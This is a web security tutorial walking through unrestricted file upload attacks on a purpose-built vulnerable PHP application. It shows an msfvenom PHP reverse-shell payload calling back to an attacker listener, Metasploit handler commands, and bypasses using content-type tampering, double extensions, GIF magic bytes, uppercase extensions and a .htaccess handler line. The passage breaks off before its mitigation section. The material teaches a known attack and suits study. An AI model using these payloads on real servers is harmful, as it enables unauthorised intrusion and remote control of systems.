<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Comprehensive Guide on Unrestricted File Upload</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/comprehensive-guide-on-unrestricted-file-upload/" rel="bookmark"><time class="entry-date published" datetime="2020-08-07T12:43:09+00:00">August 7, 2020</time><time class="updated" datetime="2025-05-31T21:19:11+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">A dynamic-web application, somewhere or the other <strong>allow</strong> <strong>its</strong> <strong>users</strong> <strong>to</strong> <strong>upload</strong> a <strong>file</strong>, whether its an image, a resume, a song, or anything specific. <em>But what, if the application does not validate these uploaded files and pass them to the server directly? </em></span><span style="color: #000000;">Today, in this article, we’ll learn how such invalidations to the user-input and server mismanagement, opens up the gates for the attackers to host malicious content, over from the <strong><em>Unrestricted</em></strong><em> <strong>File Upload functionality</strong></em> in order to drop down the web-applications.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-8"><strong><span style="color: #000000;">Introduction to Unrestricted File Upload</span></strong></li>
<li class="ai-optimize-9"><strong><span style="color: #000000;">Impact of Unrestricted File Upload</span></strong></li>
<li class="ai-optimize-10"><strong><span style="color: #000000;">File Upload Exploitation</span></strong>
<ul>
<li class="ai-optimize-11"><span style="color: #000000;">Basic File Upload</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Content-Type Restriction</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Double Extension File Upload</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Image Size Validation Bypass</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Blacklisted Extension File Upload</span></li>
</ul>
</li>
<li class="ai-optimize-16"><strong><span style="color: #000000;">How to mitigate?</span></strong></li>
</ul>
<h3 class="ai-optimize-17"><span style="color: #800000;">Introduction to Unrestricted File Upload</span></h3>
<p class="ai-optimize-18"><span style="color: #000000;"><strong><em>“Upload Here”</em> </strong>or <strong><em>“Drag Your File To Upload”</em> </strong>you might have seen these two phrases almost everywhere, whether you are setting up your profile picture or you are simply applying for a job.</span></p>
<p class="ai-optimize-19"><span style="color: #000000;">Developers scripts up <strong>File Upload HTML forms</strong>, which thus allows its users to upload files over onto the web-server.  However<em>, this ease might bring up the danger</em>, if he <strong>does</strong> <strong>not</strong> <strong>validate</strong> <strong>what</strong> <strong>files</strong> <strong>are</strong> <strong>being</strong> <strong>uploaded</strong>.</span></p>
<p class="ai-optimize-20"><span style="color: #000000;">Attackers exploit file upload vulnerabilities, which are major problems within web-based applications. In many web servers, this vulnerability relies entirely on intention, enabling an attacker to upload a file containing malicious code that can then execute on the server.</span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-V5MOO-4mwYA/Xy1AA6o_hTI/AAAAAAAAmtw/RFrLznQzF-0NuglYPlqhiSQqoAy77e1rgCLcBGAsYHQ/s1600/0.png"/></span></p>
<h3 class="ai-optimize-22"><span style="color: #800000;">Impact of Unrestricted File Upload</span></h3>
<p class="ai-optimize-23"><span style="color: #000000;">The consequences of this file upload vulnerability <strong>vary</strong> <strong>with</strong> <strong>every</strong> <strong>different</strong> <strong>web-application</strong>, as it <strong>depends</strong> <strong>on</strong> <em>how the <strong>uploaded</strong> <strong>file</strong> is <strong>processed</strong> by the application</em> <em>or where it is <strong>stored</strong></em>.</span></p>
<p class="ai-optimize-24"><span style="color: #000000;">Therefore, over from this vulnerability, the attacker is thus able to:</span></p>
<ul>
<li class="ai-optimize-25"><span style="color: #000000;">Take over the victim’s complete system with server-side attacks.</span></li>
<li class="ai-optimize-26"><span style="color: #000000;">Injects files with malicious paths which can thus overwrite existing critical files as he can include <strong>“<em>.htaccess</em>” </strong>file to execute specific scripts.</span></li>
<li class="ai-optimize-27"><span style="color: #000000;">Reveal internal &amp; sensitive information about the webserver.</span></li>
<li class="ai-optimize-28"><span style="color: #000000;">Overload the file system or the database.</span></li>
<li class="ai-optimize-29"><span style="color: #000000;">Inject phishing pages in order to simply deface the web-application.</span></li>
</ul>
<p class="ai-optimize-30"><span style="color: #000000;">However, this file upload vulnerability has thus been reported with a <strong>CVSS Score </strong>of <strong>“7.6” </strong>with <strong>High Severity </strong>under:</span></p>
<ul>
<li class="ai-optimize-31"><span style="color: #000000;"><strong>CWE-434</strong>: Unrestricted Upload of File with Dangerous Type</span></li>
</ul>
<p class="ai-optimize-32"><span style="color: #000000;">So, I guess, you are now aware of the concept of file upload and why it occurs and even the vulnerable consequences that the developer might face if the validations are not implemented properly. Thus, let’s try to dig deeper and learn how to exploit this File Upload vulnerability in all the major ways we can.</span></p>
<p class="ai-optimize-33"><span style="color: #000000;"><em>For this section, we have developed a basic web-application with some PHP scripts which is thus suffering from File Upload vulnerability. </em></span></p>
<p class="ai-optimize-34"><span style="color: #000000;"><strong>Lets Start !!</strong></span></p>
<h3 class="ai-optimize-35"><span style="color: #800000;">Basic File upload</span></h3>
<p class="ai-optimize-36"><span style="color: #000000;">There are times when the developers are not aware of the consequences of the File Upload vulnerability and thus they write up the basic PHP scripts with ease to complete up their tasks. But this leniency opens up the gates to major sections.</span></p>
<p class="ai-optimize-37"><span style="color: #000000;">Let’s check out the script which <strong>accepts</strong> the <strong>uploaded</strong> <strong>files</strong> <strong>over</strong> <strong>from</strong> the <strong>basic</strong> <strong>File</strong> <strong>upload HTML</strong> <strong>form</strong> on the webpage.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cORhAdnFdHs/Xy1AYxTy30I/AAAAAAAAmt4/bf53_t2KUeA94ABWt7-7eLPn4c5yLjoLwCLcBGAsYHQ/s1600/1.png"/></span></p>
<p class="ai-optimize-39"><span style="color: #000000;">From the above code snippet, you can see that the developer <strong>hadn’t</strong> <strong>implemented</strong> <strong>any</strong> <strong>input</strong> <strong>validation</strong> <strong>condition</strong> i.e. the <strong>server</strong> <strong>won’t</strong> <strong>check</strong> for the <strong>file</strong> <strong>extension</strong> or the <strong>content</strong>–<strong>type</strong> or anything specific arguments and simply <strong>accepts</strong> <strong>whatever</strong> <strong>we upload</strong>.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FFklt8mkKVQ/Xy1AeyZngMI/AAAAAAAAmt8/HPg1TSczRHkf0R9HeF3HputaZJDEFh9oACLcBGAsYHQ/s1600/3.png"/></span></p>
<p class="ai-optimize-41"><span style="color: #000000;">So let’s try to exploit this above web-application, by creating up <strong>a php backdoor</strong> using up our best msfvenom one-liner as</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.7 lport=4444 -f raw</pre>
<p class="ai-optimize-42"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HhZhEOzbhnM/Xy1AkbnpFLI/AAAAAAAAmuA/QXeC8BZqTgkh7sOmKcV1atUhWodUOwk2ACLcBGAsYHQ/s1600/4.png"/></span></p>
<p class="ai-optimize-43"><span style="color: #000000;"><strong>Copy</strong> and <strong>paste </strong>the highlighted code in your text editor and save as with <strong>PHP extension</strong>, here I did it as <strong>“Reverse</strong>.<strong>php” </strong>on the desktop.</span></p>
<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WVmQRjq3MRM/Xy1A5rR8_lI/AAAAAAAAmuQ/Bm5LvWjE5UAzrhCjHM786s2p76b1zrCpACLcBGAsYHQ/s1600/5.png"/></span></p>
<p class="ai-optimize-45"><span style="color: #000000;">Now, back into the application, <strong>click</strong> on <strong>Browse tag</strong> and opt<strong> Reverse.php</strong> over from the desktop.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;">So, let’s <strong>hit</strong> the <strong>upload button </strong>which will thus upload our file on the web-server.</span></p>
<p class="ai-optimize-47"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pAWia2QhcLY/Xy1A_9WasII/AAAAAAAAmuU/5Rb9yVdTF64TeD11Hd0O6gVZWQ6k7bpvACLcBGAsYHQ/s1600/6.png"/></span></p>
<p class="ai-optimize-48"><span style="color: #000000;">From the above image, you can see that our file has been successfully uploaded. Thus we can check the same by clicking over at the <strong>“here” </strong>text.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;">But wait ✋, before hitting the <strong>“here” </strong>text let’s load up our <strong>Metasploit</strong> <strong>framework</strong> and start the <b>multi handler</b> with</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use multi/handler
msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.0.7
msf exploit(handler) &gt; set lport 4444
msf exploit(handler) &gt; exploit</pre>
<p class="ai-optimize-50"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ij2tDuX_eeo/Xy1BHdza4yI/AAAAAAAAmuY/PrgvWOB4jKcsWBUOXzJOl6j-8c6Eg8nLgCLcBGAsYHQ/s1600/7.png"/></span></p>
<p class="ai-optimize-51"><span style="color: #000000;">Now, as we hit the <strong>here </strong>text, we’ll get our meterpreter session and we have got the victim’s server.</span></p>
<h3 class="ai-optimize-52"><span style="color: #800000;">Content-Type Restriction</span></h3>
<p class="ai-optimize-53"><span style="color: #000000;">Until now, we were only focusing on the fact that <em>if the developer does not validate the things up, then only the web-application is vulnerable.</em> <em>But what, if he implements the validations whether they are basic or the major ones, will it still suffer from the <strong>File</strong> <strong>Upload vulnerability?</strong> </em></span></p>
<p class="ai-optimize-54"><span style="color: #000000;">Let’s unlock this question too.</span></p>
<p class="ai-optimize-55"><span style="color: #000000;">Here, back into our vulnerable web-application, let’s try to upload our <strong>Reverse.php </strong>file again.</span></p>
<p class="ai-optimize-56"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-suuvqOXH1tk/Xy1BPfuXSVI/AAAAAAAAmug/tMO4guD0bRAaeH-j8Uzz2jDzlZSXCBhJgCLcBGAsYHQ/s1600/8.png"/></span></p>
<p class="ai-optimize-57"><span style="color: #000000;">Oops!! This time we faced up a Warning as it only accepts <strong>“PNG” </strong>files.</span></p>
<p class="ai-optimize-58"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7wcGxCrHf10/Xy1BUWmWfgI/AAAAAAAAmuo/AdMlYJDBgYY8pi1Ay-pPCIc_CvVWcOaFgCLcBGAsYHQ/s1600/9.png"/></span></p>
<p class="ai-optimize-59"><span style="color: #000000;">But why this all happened?  let’s get one step back and upload <strong>Reverse.php </strong>again, this time turn your <strong>burpsuite “ON” </strong>and capture the ongoing HTTP  Request.</span></p>
<p class="ai-optimize-60"><span style="color: #000000;">From the below image, into my burpsuite monitor, you can see that the <strong>content-type </strong>is here as  <strong>“application/x-php”.</strong></span></p>
<p class="ai-optimize-61"><span style="color: #000000;"><em> <img decoding="async" src="https://1.bp.blogspot.com/-w7Z4od7cDb8/Xy1BZ1LN2pI/AAAAAAAAmus/lHGwHKgP52kFd09sWfvBiq7g0ks7CkeaQCLcBGAsYHQ/s1600/10.png"/></em></span></p>
<h5 class="ai-optimize-62"><strong><span style="color: #000000;">What this content-type is?</span></strong></h5>
<p class="ai-optimize-63"><span style="color: #000000;"><em>“Content-Type” entity in the header indicates the internal media type of the message content. </em></span></p>
<p class="ai-optimize-64"><span style="color: #000000;">Sometimes web applications use this parameter in order to recognize a file as a valid one. For instance, they only accept the files with the “Content-Type” of “text/plain”.</span></p>
<p class="ai-optimize-65"><span style="color: #000000;">So it might possible that the developer uses this thing to validate his application.</span></p>
<p class="ai-optimize-66"><span style="color: #000000;">Let’s try to bypass this protection by <strong>changing</strong> <strong>this</strong> <strong>content</strong>–<strong>type</strong> <strong>parameter</strong> with <strong>“image/png”</strong> in the request header.</span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ydumtNYPIUE/Xy1BfiIbFuI/AAAAAAAAmuw/_alC-4xGKuINWrpu3USYy1cOrZGqvDUygCLcBGAsYHQ/s1600/11.png"/></span></p>
<p class="ai-optimize-68"><span style="color: #000000;">Hit the <strong>Forward</strong> button and check its response !!</span></p>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K_VSZqrnQo4/Xy1BnASjkfI/AAAAAAAAmu4/orp3IXb4M6Ahw1sdA04R3ST1OxpV-JaJACLcBGAsYHQ/s1600/12.png"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">From the above image, you can see that we’ve successfully bypassed this security. Again repeat the same process <strong>to run the multi handler</strong> at the background before clicking the <strong>“here”</strong>  text.</span></p>
<p class="ai-optimize-71"><span style="color: #000000;">Great !! We ‘re back into the victim’s server.</span></p>
<p class="ai-optimize-72"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OkYL4_RZNIw/Xy1Bu7ag_cI/AAAAAAAAmvA/X1BGNJk9a34Dfj1PwZxYaKLCufMUi-etQCLcBGAsYHQ/s1600/13.png"/></span></p>
<p class="ai-optimize-73"><span style="color: #000000;">Let’s check out its backend code in order to be more precise with why this all happened.</span></p>
<p class="ai-optimize-74"><span style="color: #000000;">As guessed earlier, the developer might have used the <strong>content-type</strong> parameter to be a part of his validation process. Thus here, he validates the uploading to be <strong>not acceptable </strong>when the <strong>$igcontent </strong>value is not equal to <strong>“image/png”.</strong></span></p>
<p class="ai-optimize-75"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PRBWUHjR1a4/Xy1B2RCaWcI/AAAAAAAAmvI/HUTd5DwlABktgNG0GxIXtzb6c8Bjhg2jwCLcBGAsYHQ/s1600/14.0.png"/></span></p>
<h3 class="ai-optimize-76"><span style="color: #800000;">Double Extension File Upload</span></h3>
<p class="ai-optimize-77"><span style="color: #000000;">While going into the further section, when tried again by manipulating the <strong>content-type </strong>in the Request header as with of <strong>“image/png”,</strong> we got failed this time.</span></p>
<p class="ai-optimize-78"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FU74BNtGElY/Xy1B9YoRxPI/AAAAAAAAmvQ/gLaTO82vjU0A-1rFRAszkqLM8_WYAvmVgCLcBGAsYHQ/s1600/14.png"/></span></p>
<p> </p>
<p class="ai-optimize-79"><span style="color: #000000;">From the below image, you can see that the application halt us back on the screen with an error to upload a <strong>“PNG” </strong>file.</span></p>
<p class="ai-optimize-80"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-6reuI2UAR00/Xy1CHS0ZCnI/AAAAAAAAmvc/VVKdzUzsl9EKWMv_ZiRVz-EPtk2DtqH_wCLcBGAsYHQ/s1600/15.png"/></strong></span></p>
<p class="ai-optimize-81"><span style="color: #000000;"><strong>So,</strong><strong> </strong><strong>this might all happened because </strong>the application would be <strong>checking</strong> <strong>the</strong> <strong>file</strong> <strong>extension</strong> or it is only allowing files with <strong>“.png”</strong> extension to be uploaded over on the webserver and <strong>restricts</strong> <strong>other</strong> <strong>files</strong> as the <strong>error</strong> <strong>speaks</strong> <strong>out !!</strong></span></p>
<p class="ai-optimize-82"><span style="color: #000000;">Let’s check out the developer’s code here as:</span></p>
<p class="ai-optimize-83"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7xZ809g98gw/Xy1CRqWqozI/AAAAAAAAmvk/bX5Sdsb-I18WRS9piDHZt89QKKqJ3xF0QCLcBGAsYHQ/s1600/16.0.png"/></span></p>
<p class="ai-optimize-84"><span style="color: #000000;">Here, he sets up three new variables:</span></p>
<ol>
<li class="ai-optimize-85"><span style="color: #000000;"><strong>“$igallowed” </strong>which contains up an array for the extension <strong>“png” </strong>e. the webserver will accept only that file which has .<strong>png </strong>at the end.</span></li>
<li class="ai-optimize-86"><span style="color: #000000;">Now over in the next variable <strong>$igsplit </strong>he used <strong>explode() function</strong> with a reference to <strong>“.”,</strong> thus the PHP interpreter will break up the complete filename as it encounters with over a dot <strong>“.”</strong></span></li>
<li class="ai-optimize-87"><span style="color: #000000;">In the third variable over in the <strong>$igExtension, </strong>he is using the <strong>end() function </strong>for the value of <strong>$igsplit, </strong>which will thus contain up the <strong>end</strong> <strong>value </strong>of the filename.</span></li>
</ol>
<h5 class="ai-optimize-88"><strong><span style="color: #000000;">For example:</span></strong></h5>
<p class="ai-optimize-89"><span style="color: #000000;"><em>Say we upload a file as <strong>“Reverse.php.png”</strong>, now first the <strong>$igsplit </strong>explodes up the file as it encounters with a dot i.e. the file is now in <strong>three</strong> <strong>parts</strong> as <strong>[Reverse] [php] [png].</strong> Thus now <strong>$igExtension</strong> will take the end value of the filename i.e. <strong>[png].</strong></em></span></p>
<ol start="4">
<li class="ai-optimize-90"><span style="color: #000000;">Now, he even set up an if condition that checks the content-type value, compares it with “image/png,” and verifies png in the $igExtension and the $igallowed. If he mismanages any of the three conditions, it will raise an error; otherwise, it will pass.</span></li>
</ol>
<p class="ai-optimize-91"><span style="color: #000000;">Many techniques may help us to bypass this restriction, but the most common and most preferred way is implementing <strong>“Double Extension” </strong>which thus hides up the real nature of a file by <strong>inserting</strong> <strong>multiple</strong> <strong>extensions</strong> with a filename which creates confusion for security parameters.</span></p>
<p class="ai-optimize-92"><span style="color: #000000;"><em>For example, Reverse.php.png looks like a png image, which is data, not an application, but when someone uploads the file with the double extension, it executes a php file, which is an application.</em></span></p>
<p class="ai-optimize-93"><span style="color: #000000;">Let’s check out how!!</span></p>
<p class="ai-optimize-94"><span style="color: #000000;">Here, I’ve renamed the previous file i.e. <strong>Reverse.php </strong>with <strong>“Reverse.php.png”.</strong></span></p>
<p class="ai-optimize-95"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1dTQ3BqY6r4/Xy1CZKUXNYI/AAAAAAAAmvs/HeHSz-UzsQQWjHK1-nubZXy4Q8j5cdtrQCLcBGAsYHQ/s1600/16.png"/></span></p>
<p class="ai-optimize-96"><span style="color: #000000;">From the below image, you can see that, when I clicked over at the <strong>“Upload” </strong>button, I was presented with a success window as</span></p>
<p class="ai-optimize-97"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CPPx_ZZPiGQ/Xy1CiWEQLqI/AAAAAAAAmv0/dk8sXT4lEyYjPdMlk7cpnO2xHDxJ9-RAgCLcBGAsYHQ/s1600/17.png"/></span></p>
<p class="ai-optimize-98"><span style="color: #000000;">Great !! We’ve again bypassed this file extension security. Turn you <strong>Metasploit Framework </strong>back as we did earlier and then hit the <strong>here </strong>text in order to capture up the meterpreter session.</span></p>
<p class="ai-optimize-99"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7H0rCRz32m4/Xy1CocxPNYI/AAAAAAAAmv4/YNr4jW1HWA05I6sqRhYDe8zg80Nj1qI9ACLcBGAsYHQ/s1600/18.png"/></span></p>
<p class="ai-optimize-100"><span style="color: #000000;">Wonder why this all happened?</span></p>
<p class="ai-optimize-101"><span style="color: #000000;"><em>This occurs due to one of the major reason – Server Misconfiguration</em></span></p>
<p class="ai-optimize-102"><span style="color: #000000;">The web-server might be misconfigured with the following <strong>insecure</strong> <strong>configuration, </strong>which thus enables up the <strong>double-extension </strong>and makes the web-application vulnerable to double extension attacks.</span></p>
<p class="ai-optimize-103"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cD7o8dfFY9I/Xy1Cu0K17aI/AAAAAAAAmwA/QO7_DRcK2x8-pVk0ABAgxcbNy2KcVzyTQCLcBGAsYHQ/s1600/19.1.png"/></span></p>
<h5 class="ai-optimize-104"><span style="color: #000000;"><strong>Note:</strong></span></h5>
<p class="ai-optimize-105"><span style="color: #000000;">In order to make a <strong>double extension attack </strong>possible,<strong>“$” </strong>should be removed from the end of the lines from the <strong>secured configuration </strong>using</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/apache2/mods-available/php7.4.conf</pre>
<p class="ai-optimize-106"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-Q-dc4CNSQNI/Xy1C3xBTDKI/AAAAAAAAmwI/Ew6ofYu4Xs04Y3dW6cSSC-QtSGJ_m2DPACLcBGAsYHQ/s1600/19.2.png"/></strong></span></p>
<h3 class="ai-optimize-107"><span style="color: #800000;">Image Size Validation Bypass</span></h3>
<p class="ai-optimize-108"><span style="color: #000000;">You might have seen applications that restrict the file size, i.e., they do not allow users to upload a file over a specific size. You can simply bypass this validation by uploading the smallest sized payload<strong>.</strong></span></p>
<p class="ai-optimize-109"><span style="color: #000000;">So in our case, we weren’t able to upload <strong>Reverse.php </strong>as it was about of size more than <strong>3Kb, </strong>which thus didn’t satisfy the developer’s condition. Let’s check out the backend code over for it</span></p>
<p class="ai-optimize-110"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xUgVHHBJBWk/Xy1DFF8_l4I/AAAAAAAAmwM/N72Ke4c6HL4xpQIjYiUFRMuYRr3u4nkJQCLcBGAsYHQ/s1600/19.3.png"/></span></p>
<p class="ai-optimize-111"><span style="color: #000000;">Here, he used a new variable as <strong>$igdetails</strong> which is further calling up a php function i.e. <strong>getimagesize(). </strong>Therefore this predefined function is basically used to detect image files, which initially reads up the file and return the size of the image if the genuine image is uploaded else in case an invalid file is there, then getimagesize() fails. Further, in the section, he even used another variable as <strong>$igallowed</strong> which will thus only accepts the <strong>“gif”</strong> images.</span></p>
<p class="ai-optimize-112"><span style="color: #000000;">So let’s try to call, one of the smallest payloads that is <strong>simple-backdoor.php</strong> from the <strong>webshells </strong>directory and paste it over on our Desktop.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp /usr/share/webshells/php/simple-backdoor.php /root/Desktop/</pre>
<p class="ai-optimize-113"><span style="color: #000000;">Now, its time to set double extension over it, this time we’ll be making it into a gif.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv simple-backdoor.php simple-backdoor.php.gif</pre>
<p class="ai-optimize-114"><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-xLb_khCmMHc/Xy1DQPluvhI/AAAAAAAAmwU/p21681wIy_43bfYV5z1EcwsEef1p51hEACLcBGAsYHQ/s1600/19.png"/></strong></span></p>
<p class="ai-optimize-115"><span style="color: #000000;">Wait!! Before uploading this file, we need to set one more thing i.e. we need to add a <strong>Magic Number </strong>for GIF images, such that <em>if the server doesn’t check up the extension and instead checked the header of the file, we won’t get caught.</em> So in the case of <strong>“gif”, </strong>the magic number is <strong>“GIF89”</strong> or <strong>“GIF89a”, </strong>we can use either of the two.</span></p>
<p class="ai-optimize-116"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WIZfT2f5E1o/Xy1DXWtyyII/AAAAAAAAmwc/fXpsue0kP3gd1_5CM_5aKmCW9cgS0O9iACLcBGAsYHQ/s1600/20.png"/></span></p>
<h5 class="ai-optimize-117"><span style="color: #000000;">Time to upload!!</span></h5>
<p class="ai-optimize-118"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Sh2ISsFzXPo/Xy1DyVj37yI/AAAAAAAAmww/_RVk4k0RaP0LZnvpv0bLeel0_mWlIJvXQCLcBGAsYHQ/s1600/21.png"/></span></p>
<p class="ai-optimize-119"><span style="color: #000000;">From the below image, you can see that we have successfully uploaded our file over onto the web-server.</span></p>
<p class="ai-optimize-120"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EzdhFBvDdkw/Xy1D4g4aWqI/AAAAAAAAmw0/m14s8f4YG_wlgcU7-v7k-bWTxbJrdhwFACLcBGAsYHQ/s1600/22.png"/></span></p>
<p class="ai-optimize-121"><span style="color: #000000;">Hit the <strong>“here” text </strong>and check what we could grab over with it.</span></p>
<p class="ai-optimize-122"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-w2Cl5jppfZ8/Xy1EAuZnLzI/AAAAAAAAmw8/oT6EmDcBRhsd1ksAQDXVAuX9Jpe5Scz4gCLcBGAsYHQ/s1600/23.png"/></span></p>
<p class="ai-optimize-123"><span style="color: #000000;">Great!! We have successfully bypassed this security too. Now, let’s try to grab some sensitive content.</span></p>
<p class="ai-optimize-124"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_dMV70dPTUo/Xy1EHFabFDI/AAAAAAAAmxE/LaX3IVcOLQYPxMaQaqWSuDPtF6lF740zACLcBGAsYHQ/s1600/24.png"/></span></p>
<h3 class="ai-optimize-125"><span style="color: #800000;">Blacklisted Extension File Upload</span></h3>
<p class="ai-optimize-126"><span style="color: #000000;">So, uptill now we succeed just because the developer had validated everything, but he didn’t validate the <strong>php</strong> file, say with a <strong>not allowed </strong>condition or with any specific argument.</span></p>
<p class="ai-optimize-127"><span style="color: #000000;">But here, this time we encountered the same, he blacklisted everything, saying “php or Php extensions,” he did whatever he could.</span></p>
<p class="ai-optimize-128"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gsHjO-JW8u0/Xy1EN-B4GnI/AAAAAAAAmxM/sw9gKRmSs_4KYYGlJRxCWmiM5RQoV1VcgCLcBGAsYHQ/s1600/25.png"/></span></p>
<p class="ai-optimize-129"><span style="color: #000000;"><em>Whenever someone implements a blacklist for anything, it thus opens up the gates to other things too. For example, if the developer blacklists .php, we could upload .PHP or .Php5 or anything specific.</em></span></p>
<p class="ai-optimize-130"><span style="color: #000000;">Similar here, when we tried to bypass the file upload section with every possible method. Either its content type or double extension we got failed every time and we got the reply as</span></p>
<p class="ai-optimize-131"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yE_EN6hRU1k/Xy1HNA3lMxI/AAAAAAAAmyg/E7PCVTrX6SQQ9vrrRRM2doipgRKYu-0twCLcBGAsYHQ/s1600/101.png"/></span></p>
<p class="ai-optimize-132"><span style="color: #000000;">Thus further, I tried to do that same by renaming the file from <strong>“Reverse.php” </strong>to <strong>“Reverse.PHP”</strong></span></p>
<p class="ai-optimize-133"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dkOJjo1d0D0/Xy1Hd2ThbiI/AAAAAAAAmys/FnZJ0Bw12wceTwAZU0AhPtJvq0ijv6x8wCLcBGAsYHQ/s1600/102.png"/></span></p>
<p class="ai-optimize-134"><span style="color: #000000;">And as I hit the Upload button I got <strong>success</strong>!!</span></p>
<p class="ai-optimize-135"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hDf9vj1wLJI/Xy1Hj6hCBWI/AAAAAAAAmyw/sQfwJcJ-kl40yXJfQ2ommkc95TRrMD-2QCLcBGAsYHQ/s1600/103.png"/></span></p>
<p class="ai-optimize-136"><span style="color: #000000;">But wait, let’s check whether the file works or not, as I clicked on the “here” text, and the system redirected me to the new page, but my file didn’t execute.</span></p>
<p class="ai-optimize-137"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qF372od87e8/Xy1HqdvFnPI/AAAAAAAAmy0/CnEGG7h4E5k4gHAhRGn0_ztekTE0G_utACLcBGAsYHQ/s1600/104.png"/></span></p>
<p class="ai-optimize-138"><span style="color: #000000;">So why this all happened? We’ve bypassed the security, it should work.</span></p>
<p class="ai-optimize-139"><span style="color: #000000;">This happened because the target’s web-server was not configured to execute files with <strong>.PHP extensions. </strong>i.e. we’ve bypassed the web-applications security but the server was not able to execute files other than <strong>.php extension.</strong></span></p>
<p class="ai-optimize-140"><span style="color: #000000;">So, in order to execute files with our desired extension, we need to upload an “<strong>htaccess” </strong>file i.e. a file with</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">AddType application/x-httpd-php PHP</pre>
<p class="ai-optimize-141"><span style="color: #000000;">Save the above content in a file and name it with <strong>“.htaccess”.</strong></span></p>
<p class="ai-optimize-142"><span style="color: #000000;">But, before uploading our file over onto the server, the server should accept and allow .<strong>htaccess </strong>files into the directory. Which thus can be turned <strong>“On”</strong> by setting up <strong>Allow Override</strong> to <strong>All</strong> from <strong>None</strong>.</span></p>
